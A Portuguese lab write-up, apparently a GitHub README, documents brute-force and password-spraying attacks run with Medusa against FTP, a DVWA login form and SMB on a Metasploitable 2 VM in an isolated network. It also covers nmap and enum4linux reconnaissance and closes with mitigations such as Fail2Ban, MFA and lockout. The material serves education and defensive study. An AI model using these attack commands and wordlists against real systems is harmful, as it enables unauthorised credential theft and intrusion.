# Simulação de Ataques de Força Bruta e Análise de Mitigação com Kali Linux e Medusa

Documentação prática de laboratório focado em testes de intrusão em ambiente controlado. O objetivo deste projeto é simular cenários reais de quebra de credenciais em serviços de rede e aplicações web utilizando a ferramenta **Medusa**, validar o impacto das falhas e propor contramedidas defensivas.

> **Aviso Legal:** Todos os testes descritos neste repositório foram executados exclusivamente em máquinas virtuais locais, isoladas da internet, com fins estritamente educacionais e de estudo em segurança ofensiva/defensiva.

---

## 1. Arquitetura do Ambiente de Laboratório

Para garantir o isolamento total do tráfego malicioso simulado, o laboratório foi montado utilizando o **Oracle VirtualBox** configurado com interface de rede **Host-Only (Placa Exclusiva de Hospedeiro)**, permitindo apenas a comunicação direta entre a máquina atacante e o alvo.

| Função | Sistema Operacional | IP Exemplo (Rede Host-Only) | Papel no Cenário |
| :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux | `192.168.56.101` | Execução de reconhecimento (Nmap) e ataques (Medusa). |
| **Alvo** | Metasploitable 2 | `192.168.56.102` | Hospedagem de serviços vulneráveis (vsftpd, Samba, DVWA). |

*(Nota: Caso replique este laboratório, ajuste os endereços IP conforme a faixa atribuída pelo DHCP da sua interface `vboxnet0`).*

---

## 2. Reconhecimento Inicial

Antes de iniciar as tentativas de autenticação, realizei uma varredura de portas e detecção de serviços no alvo para confirmar a disponibilidade dos vetores de ataque:

```bash
nmap -sV -p 21,80,139,445 192.168.56.102
```

**Saída relevante observada:**
* `21/tcp open ftp vsftpd 2.3.4`
* `80/tcp open http Apache httpd 2.2.8`
* `139/tcp open netbios-ssn Samba smbd 3.X`
* `445/tcp open netbios-ssn Samba smbd 3.X`

---

## 3. Preparação das Wordlists

Para manter a execução rápida e focada na validação da técnica, criei listas customizadas simples na pasta de trabalho do Kali (`/home/kali/lab-bruteforce/`):

```bash
# Lista de usuários prováveis
cat <<EOF> users.txt
admin
root
user
msfadmin
service
guest
EOF

# Lista de senhas comuns
cat <<EOF> passwords.txt
123456
admin
password
msfadmin
toor
12345678
qwerty
EOF
```

---

## 4. Execução dos Cenários de Ataque

### Cenário 1: Força Bruta no Serviço FTP

O serviço `vsftpd` rodando na porta 21 não possui bloqueio por tentativas falhas configurado por padrão no Metasploitable 2. Utilizei o módulo `ftp` do Medusa cruzando as duas listas:

```bash
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp -t 4
```

* **`-h`**: IP do host alvo.
* **`-U` / `-P`**: Arquivos com listas de usuários e senhas.
* **`-M ftp`**: Módulo específico do protocolo FTP.
* **`-t 4`**: Quantidade de threads simultâneas (mantida baixa para evitar travamento do serviço).

**Resultado e Validação:**
O Medusa identificou o par válido `msfadmin:msfadmin`. Validei o acesso conectando diretamente via cliente FTP:

```bash
ftp 192.168.56.102
```
*(Inserir captura de tela em `/images/01-ftp-success.png`)*

---

### Cenário 2: Automação de Tentativas em Formulário Web (DVWA)

Para testar aplicações web, acessei o **DVWA (Damn Vulnerable Web Application)** hospedado no Metasploitable 2 (`http://192.168.56.102/dvwa`) e configurei o nível de segurança (*DVWA Security*) para **Low**.

Antes de rodar o Medusa, inspecionei a requisição HTTP de login (via DevTools do navegador / Burp Suite) para mapear os parâmetros enviados no formulário (`username`, `password`, `Login`) e o cookie de sessão (`PHPSESSID`), além da mensagem retornada em caso de falha (`Login failed`).

```bash
medusa -h 192.168.56.102 -u admin -P passwords.txt -M http -m DIR:/dvwa/login.php -m FORM:"username=^USER^&password=^PASS^&Login=Login" -m DENY-SIGNAL:"Login failed" -m COOKIE:"PHPSESSID=SEU_ID_DE_SESSAO; security=low"
```

* **`-u admin`**: Foco em um usuário específico já conhecido da aplicação.
* **`-m DIR`**: Caminho relativo da página de autenticação.
* **`-m FORM`**: Estrutura exata dos campos enviados via método POST/GET.
* **`-m DENY-SIGNAL`**: String que indica ao Medusa que a tentativa falhou.

**Resultado e Validação:**
Credencial descoberta: `admin:password`. O acesso ao painel administrativo do DVWA foi confirmado via navegador.

*(Inserir captura de tela em `/images/02-dvwa-success.png`)*

---

### Cenário 3: Enumeração de Usuários e Password Spraying em SMB

Em ambientes corporativos, testar várias senhas para um mesmo usuário dispara bloqueios de conta (*Account Lockout*). Para contornar isso, aplica-se a técnica de **Password Spraying**: testar uma única senha comum contra vários usuários válidos.

#### Etapa A: Enumeração de Usuários
Utilizei o `enum4linux` para extrair os usuários locais cadastrados no servidor Samba antes de disparar qualquer senha:

```bash
enum4linux -U 192.168.56.102
```

A partir da saída, filtrei os nomes de usuários reais do sistema (`msfadmin`, `user`, `service`, `postgres`) e salvei em `smb_users.txt`.

#### Etapa B: Execução do Spraying
Com a lista validada, disparei uma senha padrão (`123456` ou `msfadmin`) contra toda a lista usando o módulo `smbnt`:

```bash
medusa -h 192.168.56.102 -U smb_users.txt -p msfadmin -M smbnt -t 2
```

**Resultado e Validação:**
O Medusa confirmou acesso válido para `msfadmin:msfadmin`. A validação foi feita listando os compartilhamentos disponíveis com `smbclient`:

```bash
smbclient -L //192.168.56.102 -U msfadmin
```

*(Inserir captura de tela em `/images/03-smb-spraying.png`)*

---

## 5. Medidas de Mitigação e Hardening

A execução desses testes deixa evidente que credenciais fracas expõem serviços críticos rapidamente quando não há controle de taxa ou monitoramento ativo. Para mitigar esses vetores em ambientes de produção, aplicam-se os seguintes controles:

1. **Bloqueio Dinâmico de IP (Fail2Ban):**
   * Implementar o **Fail2Ban** monitorando os logs de autenticação (`/var/log/auth.log`, logs do vsftpd e Apache). Após 3 a 5 tentativas falhas em um curto intervalo, o IP de origem recebe um bloqueio temporário via `iptables`/`nftables`.
2. **Política de Bloqueio de Contas (Account Lockout) e Rate Limiting:**
   * Configurar travas temporárias após tentativas consecutivas inválidas e aplicar *delay* progressivo (*tarpitting*) nas respostas de login para inviabilizar ferramentas automatizadas.
3. **Autenticação Multifator (MFA):**
   * Exigir segundo fator de autenticação em painéis web e acessos remotos. Mesmo que uma senha seja descoberta por força bruta ou vazamento, o acesso não é concluído sem o token.
4. **Hardening de Serviços (FTP e SMB):**
   * Substituir o **FTP** tradicional (tráfego em texto claro) por **SFTP** (via SSH) utilizando autenticação exclusivamente por chaves criptográficas (`PasswordAuthentication no`).
   * Restringir o acesso **SMB** apenas a sub-redes internas autorizadas via firewall, desabilitar o SMBv1 e bloquear consultas anônimas (`restrict anonymous = 2` no `smb.conf`) para impedir a enumeração de usuários via `enum4linux`.
5. **Proteção de Formulários Web:**
   * Implementar **CAPTCHA** após falhas consecutivas de login e utilizar tokens anti-CSRF devidamente validados a cada requisição, quebrando a automação simples de ferramentas como o Medusa.

---

## 6. Estrutura do Repositório

```text
├── images/               # Evidências e prints das execuções no terminal
├── wordlists/            # Arquivos users.txt e passwords.txt utilizados nos testes
└── README.md             # Documentação técnica completa do projeto
```

---

## 7. Principais Aprendizados

* A etapa de **enumeração** (como o uso do `enum4linux` no SMB ou a inspeção dos parâmetros HTTP no DVWA) é tão determinante quanto o ataque em si; rodar força bruta sem mapear exatamente o comportamento da resposta do servidor gera falsos positivos ou bloqueios desnecessários.
* O ajuste fino de *threads* (`-t`) no Medusa faz diferença direta na estabilidade do alvo: valores muito altos saturam serviços antigos como o `vsftpd` do Metasploitable 2 e causam perda de pacotes.
* O **Password Spraying** se mostra muito mais discreto e eficiente que a força bruta tradicional contra sistemas modernos, reforçando a necessidade de monitorar padrões horizontais de falha nos logs (vários usuários falhando a partir do mesmo IP).

---

## 8. Checklist de Publicação no GitHub

Antes de enviar o link do seu repositório, certifique-se de seguir estas etapas:

1. **Crie as pastas:** No seu repositório, crie a pasta `wordlists/` (adicionando os arquivos `users.txt`, `passwords.txt` e `smb_users.txt`) e a pasta `images/`.
2. **Adicione suas evidências:** Execute os comandos no seu Kali Linux, capture a tela nos momentos em que o Medusa exibir `[SUCCESS]` e salve as imagens na pasta `images/` (`01-ftp-success.png`, `02-dvwa-success.png`, `03-smb-spraying.png`).
3. **Atualize os links das imagens:** Substitua os marcadores `*(Inserir captura de tela...)*` neste arquivo pela sintaxe de imagem do Markdown (exemplo: `![Resultado FTP](images/01-ftp-success.png)`).
4. **Ajuste os parâmetros locais:** Troque o IP `192.168.56.102` pelo IP real da sua VM Metasploitable 2 e atualize o valor de `PHPSESSID` no comando do DVWA conforme a sessão ativa do seu navegador.